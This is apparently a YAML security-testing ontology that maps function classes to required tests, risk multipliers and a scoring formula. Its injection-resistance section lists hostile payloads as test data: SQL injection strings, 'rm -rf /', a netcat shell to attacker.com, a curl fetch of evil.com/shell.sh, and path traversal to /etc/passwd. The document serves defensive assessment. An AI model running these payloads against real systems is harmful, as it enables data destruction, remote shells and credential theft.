# Security Test Ontology
# Scientific Framework for Protocol Security Assessment
# Based on cybernetic principles of classification and response

ontology:
  version: "1.0.0"
  created: "2025-01-25"
  purpose: "Map function classes to required security tests"
  
function_classes:
  
  ENUMERATION:
    description: "Functions that list or discover available capabilities"
    risk_base: LOW
    risk_modifiers:
      - factor: "reveals_internal_structure"
        multiplier: 2.0
      - factor: "exposes_sensitive_names"
        multiplier: 3.0
      - factor: "allows_unlimited_pagination"
        multiplier: 1.5
    
    required_tests:
      - test: "rate_limit_enforcement"
        purpose: "Prevent reconnaissance amplification"
        failure_impact: MEDIUM
        
      - test: "internal_exposure_check"
        purpose: "Verify no admin/debug tools leaked"
        failure_impact: HIGH
        
      - test: "pagination_consistency"
        purpose: "Ensure predictable enumeration behavior"
        failure_impact: LOW
        
      - test: "response_time_analysis"
        purpose: "Detect timing attacks on enumeration"
        failure_impact: MEDIUM
    
  DATA_ACCESS:
    description: "Functions that retrieve data from the system"
    risk_base: MEDIUM
    risk_modifiers:
      - factor: "accesses_user_data"
        multiplier: 2.0
      - factor: "no_authentication"
        multiplier: 3.0
      - factor: "path_traversal_possible"
        multiplier: 5.0
    
    required_tests:
      - test: "authorization_validation"
        purpose: "Ensure proper access controls"
        failure_impact: CRITICAL
        
      - test: "path_traversal_prevention"
        purpose: "Block directory escape attempts"
        failure_impact: CRITICAL
        
      - test: "data_leakage_assessment"
        purpose: "Check for unintended data exposure"
        failure_impact: HIGH
        
      - test: "injection_resistance"
        purpose: "Validate input sanitization"
        failure_impact: CRITICAL
        
  EXECUTION:
    description: "Functions that execute code or commands"
    risk_base: HIGH
    risk_modifiers:
      - factor: "arbitrary_command_execution"
        multiplier: 10.0
      - factor: "sandbox_escape_possible"
        multiplier: 8.0
      - factor: "resource_exhaustion_risk"
        multiplier: 2.0
    
    required_tests:
      - test: "command_injection_prevention"
        purpose: "Block malicious command construction"
        failure_impact: CRITICAL
        
      - test: "sandbox_boundary_enforcement"
        purpose: "Verify execution containment"
        failure_impact: CRITICAL
        
      - test: "resource_limit_validation"
        purpose: "Prevent DoS via resource exhaustion"
        failure_impact: HIGH
        
      - test: "privilege_escalation_check"
        purpose: "Ensure no unauthorized elevation"
        failure_impact: CRITICAL
        
  STATE_MODIFICATION:
    description: "Functions that change system state"
    risk_base: HIGH
    risk_modifiers:
      - factor: "permanent_changes"
        multiplier: 2.0
      - factor: "affects_other_users"
        multiplier: 3.0
      - factor: "no_rollback_mechanism"
        multiplier: 2.5
    
    required_tests:
      - test: "transaction_integrity"
        purpose: "Ensure atomic state changes"
        failure_impact: HIGH
        
      - test: "validation_before_commit"
        purpose: "Prevent invalid state transitions"
        failure_impact: HIGH
        
      - test: "audit_trail_generation"
        purpose: "Track all modifications"
        failure_impact: MEDIUM
        
      - test: "concurrency_safety"
        purpose: "Handle simultaneous modifications"
        failure_impact: HIGH
        
  CONFIGURATION:
    description: "Functions that alter system configuration"
    risk_base: CRITICAL
    risk_modifiers:
      - factor: "affects_security_settings"
        multiplier: 5.0
      - factor: "changes_access_controls"
        multiplier: 4.0
      - factor: "modifies_network_settings"
        multiplier: 3.0
    
    required_tests:
      - test: "configuration_validation"
        purpose: "Ensure only valid configs accepted"
        failure_impact: CRITICAL
        
      - test: "privilege_requirement"
        purpose: "Verify admin-only access"
        failure_impact: CRITICAL
        
      - test: "change_impact_analysis"
        purpose: "Predict configuration effects"
        failure_impact: HIGH
        
      - test: "rollback_capability"
        purpose: "Ensure changes can be reverted"
        failure_impact: HIGH

test_patterns:
  
  rate_limit_enforcement:
    implementation:
      - action: "send_burst_requests"
        measure: "rejection_after_threshold"
      - action: "vary_request_timing"
        measure: "sliding_window_behavior"
    pass_criteria:
      - "rejects_after_limit"
      - "resets_properly"
      - "fair_queuing"
      
  injection_resistance:
    implementation:
      - action: "inject_sql_patterns"
        payloads:
          - "'; DROP TABLE--"
          - "1 OR 1=1"
          - "admin'--"
      - action: "inject_command_patterns"
        payloads:
          - "; rm -rf /"
          - "| nc attacker.com 4444"
          - "$(curl evil.com/shell.sh)"
      - action: "inject_path_patterns"
        payloads:
          - "../../../etc/passwd"
          - "..\\..\\..\\windows\\system32"
          - "%2e%2e%2f%2e%2e%2f"
    pass_criteria:
      - "payload_neutralized"
      - "error_handled_safely"
      - "no_execution_traces"
      
  authorization_validation:
    implementation:
      - action: "access_without_auth"
        measure: "proper_rejection"
      - action: "access_other_user_data"
        measure: "boundary_enforcement"
      - action: "privilege_escalation_attempt"
        measure: "elevation_blocked"
    pass_criteria:
      - "401_on_no_auth"
      - "403_on_forbidden"
      - "consistent_enforcement"

risk_scoring:
  calculation: |
    base_risk = function_class.risk_base
    for modifier in applicable_modifiers:
      if modifier.condition_met:
        base_risk *= modifier.multiplier
    
    for test in required_tests:
      if test.failed:
        base_risk += impact_to_score(test.failure_impact)
    
    final_risk = min(base_risk, 100)
    
  thresholds:
    LOW: [0, 20]
    MEDIUM: [21, 40]
    HIGH: [41, 70]
    CRITICAL: [71, 100]
    
  impact_values:
    LOW: 5
    MEDIUM: 10
    HIGH: 20
    CRITICAL: 40

reporting:
  required_elements:
    - element: "executive_summary"
      content:
        - "overall_risk_score"
        - "critical_findings_count"
        - "recommendation"
        
    - element: "detailed_findings"
      content:
        - "function_class"
        - "tests_performed"
        - "failures_detected"
        - "risk_calculation"
        
    - element: "evidence"
      content:
        - "request_response_pairs"
        - "test_execution_logs"
        - "sanitized_payloads"
        
    - element: "remediation"
      content:
        - "priority_order"
        - "fix_recommendations"
        - "retest_requirements"

scientific_references:
  - name: "OWASP Testing Guide"
    relevance: "Injection and access control patterns"
    
  - name: "NIST SP 800-53"
    relevance: "Security control families"
    
  - name: "Common Weakness Enumeration"
    relevance: "Vulnerability classification"
    
  - name: "MITRE ATT&CK"
    relevance: "Attack pattern mapping"

usage_notes:
  - "This ontology provides objective criteria for security assessment"
  - "Risk scores are calculated algorithmically, not subjectively"
  - "All tests must be reproducible and evidence-based"
  - "White-hat constraints apply to all test executions"